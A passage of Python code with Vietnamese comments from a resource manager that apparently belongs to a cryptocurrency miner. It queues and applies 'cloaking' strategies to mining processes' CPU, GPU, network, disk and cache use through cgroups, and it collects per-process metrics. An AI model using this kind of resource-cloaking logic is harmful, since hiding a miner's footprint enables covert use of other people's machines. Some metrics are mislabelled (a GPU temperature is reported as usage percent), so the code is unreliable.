                # Không gọi task_done() ở đây
            except Empty:
                pass
            except Exception as e:
                self.logger.error(
                    f"Lỗi trong quá trình xử lý yêu cầu cloaking: {e}"
                )

    def process_resource_adjustments(self):
        """
        Thread để xử lý các điều chỉnh tài nguyên từ resource_adjustment_queue.
        """
        while not self.stop_event.is_set():
            try:
                priority, count_val, task = self.resource_adjustment_queue.get(timeout=1)
                if task['type'] == 'monitoring':
                    self.apply_monitoring_adjustments(task['adjustments'], task['process'])
                elif task['type'] == 'cloaking':
                    for strategy in task['strategies']:
                        self.shared_resource_manager.apply_cloak_strategy(strategy, task['process'], self.config.get('cgroups', {}))
                self.resource_adjustment_queue.task_done()
            except Empty:
                pass
            except Exception as e:
                self.logger.error(f"Lỗi trong process_resource_adjustments: {e}\n{traceback.format_exc()}")

    def apply_monitoring_adjustments(self, adjustments: Dict[str, Any], process: MiningProcess):
        """
        Áp dụng các điều chỉnh dựa trên các thông số giám sát (nhiệt độ, công suất).

        Args:
            adjustments (Dict[str, Any]): Dictionary chứa các điều chỉnh cần áp dụng.
            process (MiningProcess): Đối tượng tiến trình khai thác.
        """
        try:
            if adjustments.get('cpu_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('cpu', process, self.config.get('cgroups', {}))
            if adjustments.get('gpu_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('gpu', process, self.config.get('cgroups', {}))
            if adjustments.get('network_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('network', process, self.config.get('cgroups', {}))
            if adjustments.get('disk_io_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('disk_io', process, self.config.get('cgroups', {}))
            if adjustments.get('cache_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('cache', process, self.config.get('cgroups', {}))
            # Loại bỏ việc gọi throttle_cpu_based_on_load

            self.logger.info(
                f"Áp dụng điều chỉnh monitor cho {process.name} (PID: {process.pid})."
            )
        except Exception as e:
            self.logger.error(f"apply_monitoring_adjustments error: {e}\n{traceback.format_exc()}")

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """
        Thu thập các metrics cho một tiến trình cụ thể.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.

        Returns:
            Dict[str, Any]: Dictionary chứa các metrics của tiến trình.
        """
        try:
            p_obj = psutil.Process(process.pid)
            cpu_pct = p_obj.cpu_percent(interval=1)
            mem_mb = p_obj.memory_info().rss / (1024**2)
            gpu_pct = temperature_monitor.get_gpu_temperature(process.pid) if self.shared_resource_manager.is_gpu_initialized() else 0.0
            disk_mbps = temperature_monitor.get_current_disk_io_limit(process.pid)
            net_bw = float(self.config.get('resource_allocation', {})
                                    .get('network', {})
                                    .get('bandwidth_limit_mbps', 100.0))  # Đảm bảo là float
            
            # Lấy metrics cache từ shared_resource_manager
            cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid)

            metrics = {
                'cpu_usage_percent': float(cpu_pct),
                'memory_usage_mb': float(mem_mb),
                'gpu_usage_percent': float(gpu_pct),
                'disk_io_mbps': float(disk_mbps),
                'network_bandwidth_mbps': net_bw,
                'cache_limit_percent': float(cache_l)
            }

            # Kiểm tra từng giá trị metrics để đảm bảo tính hợp lệ
            invalid_metrics = [k for k, v in metrics.items() if not isinstance(v, (int, float))]
            if invalid_metrics:
                self.logger.error(
                    f"Metrics cho PID={process.pid} chứa giá trị không hợp lệ: {invalid_metrics}. Dữ liệu: {metrics}"
                )
                return {}  # Bỏ qua PID này

            self.logger.debug(f"Metrics for PID {process.pid}: {metrics}")
            return metrics
        except Exception as e:
            self.logger.error(
                f"Lỗi collect_metrics cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return {}

    def collect_all_metrics(self) -> Dict[str, Any]:
        """
        Thu thập toàn bộ metrics cho tất cả các tiến trình khai thác.
        Trả về một dictionary với key là PID và value là các metrics.

        Returns:
            Dict[str, Any]: Dictionary chứa các metrics của tất cả các tiến trình.
        """
        metrics_data = {}
        try:
            with self.mining_processes_lock.gen_rlock(timeout=5) as mining_lock_acquired:
                if not mining_lock_acquired:
                    self.logger.error("Timeout khi acquire mining_processes_lock trong collect_all_metrics.")
                    return metrics_data

                for proc in self.mining_processes:
                    metrics = self.collect_metrics(proc)
                    if not isinstance(metrics, dict):
                        self.logger.error(
                            f"Metrics cho PID={proc.pid} không phải là dict. Dữ liệu nhận được: {metrics}"
                        )
                        continue  # Bỏ qua PID này
                    # Kiểm tra từng giá trị trong metrics
                    invalid_metrics = [k for k, v in metrics.items() if not isinstance(v, (int, float))]
                    if invalid_metrics:
                        self.logger.error(
                            f"Metrics cho PID={proc.pid} chứa giá trị không hợp lệ: {invalid_metrics}. Dữ liệu: {metrics}"
                        )
                        continue  # Bỏ qua PID này
                    metrics_data[str(proc.pid)] = metrics
            self.logger.debug(f"Collected metrics data: {metrics_data}")
        except Exception as e:
            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
        return metrics_data

    # Loại bỏ phương thức apply_recommended_action và các tham chiếu đến OpenAI

    def shutdown(self):
        """
        Dừng ResourceManager, bao gồm việc dừng các thread và tắt power management.
        """
        self.logger.info("Dừng ResourceManager...")
        self.stop_event.set()
        self.executor.shutdown(wait=True)
        self.shared_resource_manager.shutdown_nvml()  # Sử dụng GPUManager để shutdown NVML
        self.shutdown_power_management()  # Gọi hàm shutdown_power_management
        # Xóa các cgroup đã tạo nếu cần
        self.cgroup_manager.delete_cgroup('priority_cpu', controllers='cpu')
        self.logger.info("ResourceManager đã dừng.")
